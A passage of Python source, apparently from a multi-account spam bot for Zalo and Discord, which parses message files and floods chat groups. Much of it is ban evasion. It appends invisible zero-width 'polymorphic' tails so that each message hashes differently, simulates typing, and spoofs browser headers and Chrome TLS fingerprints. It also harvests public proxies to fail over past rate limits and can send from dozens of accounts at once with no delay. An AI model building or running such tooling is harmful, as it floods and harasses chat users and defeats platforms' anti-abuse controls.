    return cleaned if cleaned else line.strip()

def parse_file_stream_fast(filepath, strip_numbers=True):
    if not filepath or not os.path.exists(filepath):
        return {"blocks": [], "lines": [], "raw_lines": [], "size": 0, "block_count": 0, "line_count": 0}

    st = os.stat(filepath)
    mtime = st.st_mtime
    fsize = st.st_size
    cache_key = (filepath, bool(strip_numbers))

    with FILE_CACHE_LOCK:
        cached = FILE_MEMORY_CACHE.get(cache_key)
        if cached and cached["mtime"] == mtime and cached["size"] == fsize:
            return cached

    blocks = []
    all_lines = []
    raw_non_empty_lines = []
    current_block = []

    with open(filepath, "rb") as f:
        raw_bytes = f.read()

    text = raw_bytes.decode("utf-8", errors="ignore").replace("\r\n", "\n").replace("\r", "\n")
    raw_lines = text.split("\n")

    for ln in raw_lines:
        r_ln = ln.rstrip("\r\n")
        stripped = r_ln.strip()
        if stripped:
            raw_non_empty_lines.append(r_ln)
            clean_ln = strip_leading_line_number(r_ln, preserve_indent=True) if strip_numbers else clean_corrupted_shortcuts(r_ln)
            all_lines.append(clean_ln)
            current_block.append(clean_ln)
        else:
            if current_block:
                blocks.append("\n".join(current_block))
                current_block = []
    if current_block:
        blocks.append("\n".join(current_block))

    if not blocks and all_lines:
        blocks = list(all_lines)

    result = {
        "mtime": mtime,
        "size": fsize,
        "blocks": blocks,
        "lines": all_lines,
        "raw_lines": raw_non_empty_lines,
        "block_count": len(blocks),
        "line_count": len(all_lines),
    }

    with FILE_CACHE_LOCK:
        if len(FILE_MEMORY_CACHE) > 40:
            oldest_key = next(iter(FILE_MEMORY_CACHE))
            FILE_MEMORY_CACHE.pop(oldest_key, None)
        FILE_MEMORY_CACHE[cache_key] = result

    return result

def get_ordered_files_with_display_num(file_type=None):
    conn = db()
    rows = conn.execute("SELECT * FROM files ORDER BY id ASC").fetchall()
    conn.close()
    out = []
    for idx, r in enumerate(rows, start=1):
        d = dict(r)
        d["display_num"] = idx
        ft = str(d.get("file_type") or "").strip().lower()
        if not ft:
            ft = "ngon" if "ngon" in str(d.get("filename") or "").lower() else "nhay"
        d["file_type"] = ft
        if file_type and ft != str(file_type).lower():
            continue
        out.append(d)
    return out

def resolve_file_record(query_val):
    if query_val is None:
        return None
    q = str(query_val).strip()
    if not q:
        return None

    files = get_ordered_files_with_display_num()
    if not files:
        return None

    num_match = re.match(r"^#?(\d+)$", q)
    if num_match:
        num = int(num_match.group(1))
        by_disp = next((f for f in files if f["display_num"] == num), None)
        if by_disp:
            return by_disp
        by_id = next((f for f in files if f["id"] == num), None)
        if by_id:
            return by_id

    if q.lower() in ("auto", "default", "moinhat", "latest"):
        return files[-1]

    q_low = q.lower()
    for f in files:
        if f["filename"].lower() == q_low or q_low in f["filename"].lower():
            return f
    return None

def get_blocks_from_file_query(query_val, mode="fast"):
    rec = resolve_file_record(query_val)
    if not rec:
        return []
    parsed = parse_file_stream_fast(rec["filepath"], strip_numbers=True)
    if mode == "treo_nhay":
        return parsed["lines"] if parsed["lines"] else parsed["blocks"]
    return parsed["blocks"]

# HẠ TẦNG ANTI-BAN & ANTI-DIE-ALL SIÊU ĐỈNH CHO CẢ 2 APP (ZALO & DISCORD)
ZERO_WIDTH_ZALO_POOL = ["\u200b", "\u200c", "\u2060"]
ZERO_WIDTH_DISCORD_POOL = ["\u200b", "\u200c", "\u200d", "\u2060"]
_ANTIBAN_COUNTER = 0
_ANTIBAN_LOCK = threading.RLock()

class ZaloSmartAntiBanEngine:
    """Hạ tầng Anti-Ban & Chống Cấm Chat Box Zalo Thế Hệ Mới (VIP Anti-Restriction Shield):
    - Sliding-Window Box Pacing: Tự động điều tiết nhịp gửi theo từng Box (grid) chống mã phạt cấm chat -112, -114, 300, 301.
    - Auto Box Cooldown & Recovery: Khi phát hiện dấu hiệu giới hạn tốc độ từ máy chủ Zalo nhóm, tự động làm mát Box 4.5s & đổi cổng.
    - Typing Pulse Simulation: Giả lập trạng thái đang gõ phím định kỳ trên từng Box giúp phiên Zalo giống người thật 100%.
    - Dynamic Zero-Shift Polymorphic Tail: Gắn chữ ký tàng hình biến thiên độ dài (3-11 ký tự) ở cuối câu sau khi tính style,
      đảm bảo mỗi gói tin có độ dài & mã băm khác nhau 100% mà không làm lệch vị trí màu chữ hay tag!"""

    RATELIMIT_CODES = {-2, -108, -112, -114, 112, 114, 300, 301, 302, 429, 500, 1001, 2001}
    AUTH_CODES = {-401, 401, -102, 102, -30, -13, 3003}

    _BOX_LOCK = threading.RLock()
    _BOX_SEND_HISTORY = defaultdict(lambda: deque(maxlen=24))
    _BOX_COOLDOWN_UNTIL = defaultdict(float)
    _BOX_LAST_HASH = {}
    _BOX_TYPING_TS = defaultdict(float)

    BROWSER_PROFILES = [
        {
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "platform": '"Windows"'
        },
        {
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
            "sec_ch_ua": '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
            "platform": '"Windows"'
        },
        {
            "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "sec_ch_ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "platform": '"macOS"'
        },
    ]

    @classmethod
    def get_session_headers(cls, imei):
        idx = zlib.crc32(str(imei or "zalo").encode("utf-8")) % len(cls.BROWSER_PROFILES)
        prof = cls.BROWSER_PROFILES[idx]
        return {
            "User-Agent": prof["ua"],
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "vi-VN,vi;q=0.95,en-US;q=0.8,en;q=0.7",
            "Origin": "https://chat.zalo.me",
            "Referer": "https://chat.zalo.me/",
            "Sec-Ch-Ua": prof["sec_ch_ua"],
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": prof["platform"],
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }

    @classmethod
    def pre_send_box_guard(cls, imei, thread_id, is_group=True, antiband=True, priority_bypass=False):
        """Lá chắn bảo vệ Box siêu tốc: không gây trễ giả tạo khi chạy nhiều Acc, chỉ làm mát ngắn khi máy chủ Zalo báo mã giới hạn thực tế."""
        if priority_bypass or not antiband or not thread_id:
            return 0.0
        key = f"{imei}:{thread_id}"
        now = time.time()
        sleep_needed = 0.0
        with cls._BOX_LOCK:
            cd_until = cls._BOX_COOLDOWN_UNTIL.get(key, 0.0)
            if cd_until > now:
                sleep_needed = min(0.35, cd_until - now)
            hist = cls._BOX_SEND_HISTORY[key]
            while hist and (now - hist[0]) > 2.5:
                hist.popleft()
            hist.append(now)
        if sleep_needed > 0.005:
            time.sleep(sleep_needed)
        return sleep_needed

    @classmethod
    def report_box_result(cls, imei, thread_id, err_code=0):
        """Ghi nhận phản hồi từ Zalo để tự động kích hoạt khiên làm mát nếu Box báo giới hạn tốc độ."""
        if not thread_id:
            return
        key = f"{imei}:{thread_id}"
        now = time.time()
        with cls._BOX_LOCK:
            if err_code in cls.RATELIMIT_CODES:
                cls._BOX_COOLDOWN_UNTIL[key] = now + random.uniform(3.8, 5.5)
            elif err_code == 0 and key in cls._BOX_COOLDOWN_UNTIL:
                if cls._BOX_COOLDOWN_UNTIL[key] <= now:
                    cls._BOX_COOLDOWN_UNTIL.pop(key, None)

    @classmethod
    def should_send_typing_pulse(cls, imei, thread_id):
        key = f"{imei}:{thread_id}"
        now = time.time()
        with cls._BOX_LOCK:
            last_t = cls._BOX_TYPING_TS.get(key, 0.0)
            if (now - last_t) >= 14.0:
                cls._BOX_TYPING_TS[key] = now
                return True
        return False

    @staticmethod
    def generate_zero_shift_tail(thread_id=""):
        global _ANTIBAN_COUNTER
        with _ANTIBAN_LOCK:
            _ANTIBAN_COUNTER = (_ANTIBAN_COUNTER + 1) & 0xFFFFFF
            seq = _ANTIBAN_COUNTER
        t_hash = zlib.crc32(str(thread_id).encode("utf-8")) & 0xFFF
        salt = ((int(time.time() * 1000) & 0x1FFF) ^ (seq << 2) ^ t_hash ^ random.randint(1, 0xFFFF)) & 0xFFFF
        tail_len = 4 + (seq % 7)  # Độ dài biến thiên 4..10 ký tự tàng hình
        chars = []
        val = salt
        for _ in range(tail_len):
            chars.append(ZERO_WIDTH_ZALO_POOL[val % len(ZERO_WIDTH_ZALO_POOL)])
            val = (val // len(ZERO_WIDTH_ZALO_POOL)) ^ random.randint(0, 3)
        return "".join(chars)

    @classmethod
    def mutate_zalo_word_boundaries(cls, text, salt=0):
        if not text or " " not in text:
            return text
        tokens = text.split(" ")
        if len(tokens) <= 1:
            return text
        out = [tokens[0]]
        for idx, tk in enumerate(tokens[1:], start=1):
            if tk.startswith("@") or out[-1].startswith("@"):
                out.append(" " + tk)
            elif idx <= 3 and ((salt + idx) & 1) == 1:
                zw = ZERO_WIDTH_ZALO_POOL[(salt + idx) % len(ZERO_WIDTH_ZALO_POOL)]
                out.append(" " + zw + tk)
            else:
                out.append(" " + tk)
        return "".join(out)

    @classmethod
    def append_tail(cls, final_msg, thread_id=""):
        if not final_msg:
            return final_msg
        return final_msg + " " + cls.generate_zero_shift_tail(thread_id)

    @staticmethod
    def compute_human_cadence_delay(base_delay, burst_cnt=0, risk_score=0.0, adaptive_bonus=0.0, text_len=20):
        d = float(base_delay or 0.0)
        if d <= 0.0:
            return 0.0
        return d


class WaveFairnessEngine:
    """Bộ Điều Phối Luồng Sóng Đa Tài Khoản Siêu Mượt (50+ Acc × 200+ Nhóm Lock-Free Synchronizer ):
    - Khi cài đặt Delay = 0s (0.0s): Tuyệt đối KHÔNG giữ chân bất kỳ tài khoản nào (0.0ms pause) — chỉnh là phang đồng loạt!
    - Khi có cài đặt Delay > 0s: Chỉ cân bằng nhịp giữa các tài khoản đang hoạt động (active trong 4s gần nhất),
      không để 1 tài khoản chậm làm kẹt 49 tài khoản còn lại!"""

    _LOCK = threading.RLock()
    _TASK_ACC_COUNTS = defaultdict(lambda: defaultdict(int))
    _TASK_ACC_LAST_TS = defaultdict(lambda: defaultdict(float))
    _BOX_ROUND_ROBIN = defaultdict(int)

    @classmethod
    def register_accounts_for_wave(cls, task_key, acc_ids):
        now = time.time()
        with cls._LOCK:
            d = cls._TASK_ACC_COUNTS[task_key]
            ts_map = cls._TASK_ACC_LAST_TS[task_key]
            for aid in acc_ids:
                ia = int(aid)
                d[ia] = d.get(ia, 0)
                ts_map[ia] = now

    @classmethod
    def record_acc_sent(cls, task_key, acc_id):
        ia = int(acc_id)
        cls._TASK_ACC_COUNTS[task_key][ia] += 1
        cls._TASK_ACC_LAST_TS[task_key][ia] = time.time()

    @classmethod
    def get_fair_pacing_pause(cls, task_key, acc_id, base_delay=0.0):
        return 0.0


class ProxyPoolEngine:
    """Hệ Thống Proxy Pool NHK Siêu Tốc Cân 50+ Acc × 500+ Box & Tự Khởi Chạy Xếp Hạng Độ Trễ (PRX Auto-Start & Fastest-First Engine):
    - Hỗ trợ duyệt & nạp hàng loạt file .txt / .csv với mọi định dạng Proxy: ip:port, ip:port:user:pass, user:pass@ip:port, http://..., socks5://...
    - Tự động khởi chạy kiểm tra tốc độ (Background Multi-Thread Latency Benchmark), đo chính xác Ping (ms) của từng Proxy,
      mở sẵn kết nối Keep-Alive (TCP_NODELAY=1) và sắp xếp Proxy nhanh nhất lên đầu bảng!
    - Làn ưu tiên phản hồi lệnh (pick_fastest_proxy_candidates): Luôn chọn các Proxy có Ping thấp nhất (< 150ms) hoặc Direct Keep-Alive
      để khi 1 Acc đang treo 500 Box vẫn phản hồi lệnh .menu, .cp, .n, .g, .t ngay lập tức không bao giờ làm lơ lệnh!"""

    _LOCK = threading.RLock()
    _PROXIES = []
    _HEALTHY_TUPLE = ()
    _FASTEST_TUPLE = ()
    _PROXY_LATENCY_MS = {}
    _LAST_SNAPSHOT_REBUILD_TS = 0.0
    _BAD_PROXIES = {}
    _PROXY_SESSIONS = {}
    _ENABLED = True
    _CURSOR = 0
    _FAST_CURSOR = 0
    _LOADED = False
    _BENCHMARK_RUNNING = False
    _STATS = {
        "routed_ok": 0,
        "failover_hits": 0,
        "last_check_alive": 0,
        "fastest_ms": 0.0,
        "avg_ms": 0.0,
        "auto_started": False,
    }

    @classmethod
    def parse_proxy_line(cls, raw_line):
        s = str(raw_line or "").strip().strip('"').strip("'")
        if not s or s.startswith("#") or s.startswith("//"):
            return ""
        # Nếu dòng CSV có nhiều cột, tìm cột chứa ip:port
        if "," in s or "\t" in s:
            for col in re.split(r"[,\t]+", s):
                col_s = col.strip()
                if ":" in col_s and any(ch.isdigit() for ch in col_s):
                    s = col_s
                    break
        for pfx in ("http://", "https://", "socks5://", "socks5h://", "socks4://"):
            if s.lower().startswith(pfx):
                return s
        if "@" in s:
            return f"http://{s}"
        parts = s.split(":")
        if len(parts) == 2:
            host, port = parts[0].strip(), parts[1].strip()
            if host and port.isdigit():
                return f"http://{host}:{port}"
        elif len(parts) >= 4:
            host, port, user, pw = parts[0].strip(), parts[1].strip(), parts[2].strip(), ":".join(parts[3:]).strip()
            if host and port.isdigit():
                return f"http://{user}:{pw}@{host}:{port}"
        return ""

    @classmethod
    def extract_proxies_from_any_text(cls, raw_text):
        parsed = []
        seen = set()
        for ln in str(raw_text or "").replace("\r\n", "\n").replace("\r", "\n").replace(";", "\n").split("\n"):
            p = cls.parse_proxy_line(ln)
            if p and p not in seen:
                seen.add(p)
                parsed.append(p)
        return parsed

    @classmethod
    def _rebuild_healthy_snapshot_unlocked(cls):
        now = time.time()
        cls._LAST_SNAPSHOT_REBUILD_TS = now
        if not cls._ENABLED or not cls._PROXIES:
            cls._HEALTHY_TUPLE = ()
            cls._FASTEST_TUPLE = ()
            return
        healthy = [p for p in cls._PROXIES if now >= cls._BAD_PROXIES.get(p, 0.0)]
        if not healthy:
            sorted_all = sorted(cls._PROXIES, key=lambda x: cls._BAD_PROXIES.get(x, 0.0))
            healthy = sorted_all[:max(1, min(6, len(sorted_all)))]
        # Xếp hạng các Proxy có độ trễ thấp nhất (Ping ms nhỏ nhất) lên đầu
        healthy.sort(key=lambda p: cls._PROXY_LATENCY_MS.get(p, 888.0))
        cls._HEALTHY_TUPLE = tuple(healthy)
        top_k = max(1, min(16, (len(healthy) + 1) // 2))
        cls._FASTEST_TUPLE = tuple(healthy[:top_k])

    @classmethod
    def _ensure_loaded(cls):
        if cls._LOADED:
            return
        with cls._LOCK:
            if cls._LOADED:
                return
            cls._LOADED = True
            try:
                raw_txt = get_setting("proxy_pool_list", "")
                en_str = get_setting("proxy_pool_enabled", "1")
                cls._ENABLED = (str(en_str) != "0")
                parsed = cls.extract_proxies_from_any_text(raw_txt)
                cls._PROXIES = parsed
                cls._rebuild_healthy_snapshot_unlocked()
            except Exception:
                pass
        if cls._PROXIES and cls._ENABLED:
            cls.trigger_auto_warmup_background()

    @classmethod
    def trigger_auto_warmup_background(cls):
        if cls._BENCHMARK_RUNNING:
            return
        def _bg_runner():
            try:
                cls.test_all_proxies(timeout_sec=1.8)
            except Exception:
                pass
        threading.Thread(target=_bg_runner, daemon=True).start()

    @classmethod
    def save_proxies(cls, raw_text, enabled=True, auto_start=True):
        parsed = cls.extract_proxies_from_any_text(raw_text)
        with cls._LOCK:
            cls._PROXIES = parsed
            cls._BAD_PROXIES.clear()
            cls._ENABLED = bool(enabled)
            cls._LOADED = True
            cls._STATS["auto_started"] = bool(enabled and parsed)
            cls._rebuild_healthy_snapshot_unlocked()
        for p in parsed[:96]:
            cls._get_or_create_proxy_session(p)
        set_setting("proxy_pool_list", "\n".join(parsed))
        set_setting("proxy_pool_enabled", "1" if enabled else "0")
        if auto_start and parsed and enabled:
            cls.trigger_auto_warmup_background()
        return len(parsed)

    @classmethod
    def add_proxies_incremental(cls, raw_text, auto_start=True):
        cls._ensure_loaded()
        added = 0
        new_items = []
        extracted = cls.extract_proxies_from_any_text(raw_text)
        with cls._LOCK:
            existing_set = set(cls._PROXIES)
            for p in extracted:
                if p not in existing_set:
                    cls._PROXIES.append(p)
                    existing_set.add(p)
                    new_items.append(p)
                    added += 1
            cls._BAD_PROXIES.clear()
            cls._ENABLED = True
            cls._STATS["auto_started"] = True
            full_list = list(cls._PROXIES)
            cls._rebuild_healthy_snapshot_unlocked()
        for p in new_items[:96]:
            cls._get_or_create_proxy_session(p)
        set_setting("proxy_pool_list", "\n".join(full_list))
        set_setting("proxy_pool_enabled", "1")
        if auto_start and full_list:
            cls.trigger_auto_warmup_background()
        return added, len(full_list)

    @classmethod
    def _get_or_create_proxy_session(cls, proxy_url):
        sess = cls._PROXY_SESSIONS.get(proxy_url)
        if sess is not None:
            return sess
        with cls._LOCK:
            sess = cls._PROXY_SESSIONS.get(proxy_url)
            if sess is None:
                sess = requests.Session()
                try:
                    tls_ad = Chrome131TLSAdapter(pool_connections=256, pool_maxsize=512, max_retries=0)
                    sess.mount("https://", tls_ad)
                except Exception:
                    sess.mount("https://", HTTPAdapter(pool_connections=256, pool_maxsize=512, max_retries=0))
                sess.mount("http://", HTTPAdapter(pool_connections=256, pool_maxsize=512, max_retries=0))
                sess.proxies.update({"http": proxy_url, "https": proxy_url})
                cls._PROXY_SESSIONS[proxy_url] = sess
            return sess

    @classmethod
    def pick_fastest_proxy_candidates(cls, seed_key=None, max_candidates=2):
        """Làn ưu tiên siêu tốc dành riêng cho phản hồi lệnh (.menu, .cp, .ping, .status):
        Chỉ chọn trong nhóm Proxy đã xác thực có Ping thấp nhất (< 220ms) để phản hồi lệnh ngay lập tức!"""
        if not cls._LOADED:
            cls._ensure_loaded()
        if not cls._ENABLED or not cls._PROXIES:
            return []
        snap = cls._FASTEST_TUPLE or cls._HEALTHY_TUPLE
        if not snap:
            return []
        # Chỉ dùng Proxy cho lệnh ưu tiên nếu đã đo được độ trễ thực sự nhanh (<= 320ms)
        verified_fast = [p for p in snap if cls._PROXY_LATENCY_MS.get(p, 999.0) <= 320.0]
        if not verified_fast:
            return []
        n = len(verified_fast)
        base_idx = cls._FAST_CURSOR % n
        cls._FAST_CURSOR = (cls._FAST_CURSOR + 1) & 0xFFFFFF
        k = min(max_candidates, n)
        return [verified_fast[(base_idx + i) % n] for i in range(k)]

    @classmethod
    def pick_proxy_candidates(cls, seed_key=None, max_candidates=3):
        if not cls._LOADED:
            cls._ensure_loaded()
        if not cls._ENABLED or not cls._PROXIES:
            return []
        now = time.time()
        if cls._BAD_PROXIES and (now - cls._LAST_SNAPSHOT_REBUILD_TS > 1.2):
            with cls._LOCK:
                cls._rebuild_healthy_snapshot_unlocked()
        snap = cls._HEALTHY_TUPLE
        if not snap:
            return []
        n = len(snap)
        cls._CURSOR = (cls._CURSOR + 1) & 0xFFFFFF
        if seed_key is not None:
            base_idx = (zlib.crc32(str(seed_key).encode("utf-8")) + cls._CURSOR) % n
        else:
            base_idx = cls._CURSOR % n
        k = min(max_candidates, n)
        if k == 1:
            return [snap[base_idx]]
        return [snap[(base_idx + i) % n] for i in range(k)]

    @classmethod
    def pick_proxy_dict(cls, seed_key=None):
        cands = cls.pick_proxy_candidates(seed_key=seed_key, max_candidates=1)
        if not cands:
            return None
        chosen = cands[0]
        return {"http": chosen, "https": chosen, "_raw": chosen}

    @classmethod
    def report_proxy_ok(cls, proxy_url, latency_ms=None):
        if not proxy_url:
            return
        cls._STATS["routed_ok"] += 1
        if latency_ms is not None and latency_ms > 0:
            prev = cls._PROXY_LATENCY_MS.get(proxy_url, float(latency_ms))
            cls._PROXY_LATENCY_MS[proxy_url] = round(prev * 0.6 + float(latency_ms) * 0.4, 1)
        if proxy_url in cls._BAD_PROXIES:
            with cls._LOCK:
                cls._BAD_PROXIES.pop(proxy_url, None)
                cls._rebuild_healthy_snapshot_unlocked()

    @classmethod
    def report_proxy_bad(cls, proxy_url, cooldown_sec=8.0):
        if not proxy_url:
            return
        cls._STATS["failover_hits"] += 1
        with cls._LOCK:
            cls._BAD_PROXIES[proxy_url] = time.time() + float(cooldown_sec)
            cls._rebuild_healthy_snapshot_unlocked()

    PUBLIC_PROXY_FEEDS = (
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=1500&country=SG,VN,HK,JP,TW&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    )
    _AUTO_HARVEST_STARTED = False

    @classmethod
    def start_auto_proxy_harvester_background(cls):
        with cls._LOCK:
            if cls._AUTO_HARVEST_STARTED:
                return
            cls._AUTO_HARVEST_STARTED = True

        def _harvest_loop():
            time.sleep(2.5)
            while True:
                try:
                    cls._ensure_loaded()
                    if len(cls._HEALTHY_TUPLE) < 8:
                        raw_candidates = []
                        sess_h = requests.Session()
                        for feed_u in cls.PUBLIC_PROXY_FEEDS:
                            try:
                                r_f = sess_h.get(feed_u, timeout=4.0)
                                if r_f.status_code == 200 and r_f.text:
                                    extracted = cls.extract_proxies_from_any_text(r_f.text)
                                    raw_candidates.extend(extracted[:35])
                            except Exception:
                                pass
                        if raw_candidates:
                            unique_cands = list(dict.fromkeys(raw_candidates))[:48]
                            fast_verified = []
                            def _quick_probe(p_u):
                                t0 = time.perf_counter()
                                try:
                                    px_s = cls._get_or_create_proxy_session(p_u)
                                    r_p = px_s.get("https://discord.com/api/v9/experiments", timeout=(0.85, 1.15))
                                    if r_p.status_code in (200, 401, 403, 429):
                                        ms = round((time.perf_counter() - t0) * 1000.0, 1)
                                        if ms <= 280.0:
                                            return p_u, ms
                                except Exception:
                                    pass
                                return None, 9999.0
                            with ThreadPoolExecutor(max_workers=16) as hp:
                                for pu_ok, ms_ok in hp.map(_quick_probe, unique_cands):
                                    if pu_ok:
                                        fast_verified.append((pu_ok, ms_ok))
                            if fast_verified:
                                with cls._LOCK:
                                    ex_set = set(cls._PROXIES)
                                    for pu_ok, ms_ok in fast_verified:
                                        if pu_ok not in ex_set and len(cls._PROXIES) < 64:
                                            cls._PROXIES.append(pu_ok)
                                            ex_set.add(pu_ok)
                                        cls._PROXY_LATENCY_MS[pu_ok] = ms_ok
                                    cls._rebuild_healthy_snapshot_unlocked()
                except Exception:
                    pass
                time.sleep(300.0)

        threading.Thread(target=_harvest_loop, daemon=True).start()

    @classmethod
    def request_with_fast_failover(cls, session_obj, method, url, seed_key=None, priority_bypass=False, **kwargs):
        # Ưu tiên số 1: Luồng Direct Multi-Edge Keep-Alive (0ms độ trễ)
        # QUAN TRỌNG: Tuyệt đối KHÔNG gửi lặp (double-POST) khi gói POST đã truyền đi nhưng đọc phản hồi chậm (ReadTimeout),
        # vì gửi lặp POST sẽ khiến Zalo đăng 2 tin nhắn trùng nhau!
        is_post = str(method or "GET").upper() == "POST"
        if "timeout" not in kwargs:
            kwargs["timeout"] = (2.2, 6.0) if is_post else ((0.85, 2.0) if priority_bypass else (1.2, 3.0))
        try:
            resp_dir = session_obj.request(method, url, **kwargs)
            if resp_dir.status_code != 429 or not cls._PROXIES or not cls._ENABLED:
                return resp_dir
        except requests.exceptions.ReadTimeout:
            # Gói tin POST đã được đẩy lên máy chủ Zalo -> Không bao giờ gửi lại lần 2!
            raise
        except Exception:
            if is_post or not cls._PROXIES or not cls._ENABLED:
                raise

        cands = (
            cls.pick_fastest_proxy_candidates(seed_key=seed_key, max_candidates=1)
            if priority_bypass else
            cls.pick_proxy_candidates(seed_key=seed_key, max_candidates=2)
        )
        if cands:
            base_headers = kwargs.get("headers") or (dict(session_obj.headers) if getattr(session_obj, "headers", None) else None)
            base_cookies = kwargs.get("cookies") or (session_obj.cookies.get_dict() if getattr(session_obj, "cookies", None) else None)
            for raw_px in cands:
                px_sess = cls._get_or_create_proxy_session(raw_px)
                px_kwargs = dict(kwargs)
                px_kwargs.pop("proxies", None)
                px_kwargs["timeout"] = (0.50, 1.50) if priority_bypass else (0.70, 2.00)
                if base_headers and "headers" not in px_kwargs:
                    px_kwargs["headers"] = base_headers
                if base_cookies and "cookies" not in px_kwargs:
                    px_kwargs["cookies"] = base_cookies
                t0_p = time.perf_counter()
                try:
                    resp = px_sess.request(method, url, **px_kwargs)
                    lat_p = (time.perf_counter() - t0_p) * 1000.0
                    sc = resp.status_code
                    if sc not in (407, 502, 503, 504, 520, 521, 522, 524):
                        if sc == 429:
                            cls.report_proxy_bad(raw_px, cooldown_sec=4.5)
                            continue
                        cls.report_proxy_ok(raw_px, latency_ms=lat_p)
                        return resp
                    cls.report_proxy_bad(raw_px, cooldown_sec=10.0)
                except Exception:
                    cls.report_proxy_bad(raw_px, cooldown_sec=12.0)

        raise Exception("DirectAndProxyUnavailable")

    @classmethod
    def test_all_proxies(cls, timeout_sec=2.0):
        cls._ensure_loaded()
        with cls._LOCK:
            plist = list(cls._PROXIES)
            cls._BENCHMARK_RUNNING = True
        try:
            if not plist:
                return {"ok": True, "total": 0, "alive": 0, "dead": 0, "fastest_ms": 0, "message": "Chưa có Proxy nào trong danh sách (Đang chạy Direct Keep-Alive 0ms)."}
            alive_list = []
            dead_list = []
            latencies = []

            def _probe(p_url):
                t0 = time.perf_counter()
                try:
                    px_s = cls._get_or_create_proxy_session(p_url)
                    r = px_s.get("https://discord.com/api/v9/experiments", timeout=(timeout_sec, timeout_sec + 0.5))
                    if r.status_code in (200, 401, 403, 429):
                        ms = round((time.perf_counter() - t0) * 1000.0, 1)
                        return True, p_url, ms
                except Exception:
                    pass
                return False, p_url, 9999.0

            with ThreadPoolExecutor(max_workers=min(64, max(1, len(plist)))) as pool:
                for ok_p, p_u, ms_val in pool.map(_probe, plist):
                    if ok_p:
                        alive_list.append(p_u)
                        latencies.append(ms_val)
                        cls.report_proxy_ok(p_u, latency_ms=ms_val)
                    else:
                        dead_list.append(p_u)
                        cls.report_proxy_bad(p_u, cooldown_sec=45.0)

            with cls._LOCK:
                cls._STATS["last_check_alive"] = len(alive_list)
                cls._STATS["fastest_ms"] = round(min(latencies), 1) if latencies else 0.0
                cls._STATS["avg_ms"] = round(sum(latencies) / len(latencies), 1) if latencies else 0.0
                cls._rebuild_healthy_snapshot_unlocked()

            fastest_str = f" • Nhanh nhất: {cls._STATS['fastest_ms']}ms" if latencies else ""
            return {
                "ok": True,
                "total": len(plist),
                "alive": len(alive_list),
                "dead": len(dead_list),
                "fastest_ms": cls._STATS["fastest_ms"],
                "avg_ms": cls._STATS["avg_ms"],
                "alive_proxies": list(cls._HEALTHY_TUPLE),
                "message": f"Đã tự khởi chạy & xếp hạng {len(plist)} PRX: {len(alive_list)} PRX Sống Siêu Tốc{fastest_str} • {len(dead_list)} PRX Chậm/Die (Đã cách ly)!"
            }
        finally:
            with cls._LOCK:
                cls._BENCHMARK_RUNNING = False

    @classmethod
    def trigger_background_benchmark(cls):
        return cls.trigger_auto_warmup_background()

    @classmethod
    def clear_all(cls):
        return cls.save_proxies("", enabled=True, auto_start=False)

    @classmethod
    def get_snapshot(cls):
        cls._ensure_loaded()
        now = time.time()
        with cls._LOCK:
            total = len(cls._PROXIES)
            cooling = sum(1 for p in cls._PROXIES if now < cls._BAD_PROXIES.get(p, 0.0))
            healthy = max(0, total - cooling)
            top_fast = [
                {"proxy": p, "ms": cls._PROXY_LATENCY_MS.get(p, 0.0)}
                for p in (cls._FASTEST_TUPLE[:5] if cls._FASTEST_TUPLE else [])
            ]
            return {
                "enabled": cls._ENABLED,
                "total": total,
                "healthy": healthy,
                "cooling": cooling,
                "routed_ok": cls._STATS["routed_ok"],
                "failover_hits": cls._STATS["failover_hits"],
                "fastest_ms": cls._STATS.get("fastest_ms", 0.0),
                "avg_ms": cls._STATS.get("avg_ms", 0.0),
                "benchmark_running": cls._BENCHMARK_RUNNING,
                "top_fastest": top_fast,
                "proxies_text": "\n".join(cls._PROXIES),
            }


class Chrome131TLSAdapter(HTTPAdapter):
    """Bộ điều hợp TLS chuẩn trình duyệt Chrome 131 + TCP_NODELAY (PRX > 1.500+ Tin/Phút Không Độ Trễ):
    - Tắt thuật toán Nagle (TCP_NODELAY = 1) và bật SO_KEEPALIVE trên từng socket giúp đẩy gói tin tức thì trong 0ms!"""

    def __init__(self, *args, **kwargs):
        self._ssl_ctx = DiscordStealthAntiBanEngine.create_chrome_tls_context()
        super().__init__(*args, **kwargs)

    def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
        pool_kwargs["ssl_context"] = self._ssl_ctx
        pool_kwargs["socket_options"] = [
            (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),
            (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1),
        ]
        return super().init_poolmanager(connections, maxsize, block=block, **pool_kwargs)

    def proxy_manager_for(self, proxy, **proxy_kwargs):
        proxy_kwargs["ssl_context"] = self._ssl_ctx
        proxy_kwargs["socket_options"] = [
            (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),
            (socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1),
        ]
        return super().proxy_manager_for(proxy, **proxy_kwargs)

class DiscordFirewallEngine:
    """Tường Lửa Chống Quét & Chống Báo Reset Mật Khẩu Discord 9 Lớp (Discord Anti-Reset-Key Firewall):
    - Lớp 1 (Anti-Homoglyph & Anti-Cf Sanitizer): Loại bỏ 100% ký tự Cyrillic pha trộn trong từ Latin (nguyên nhân số 1
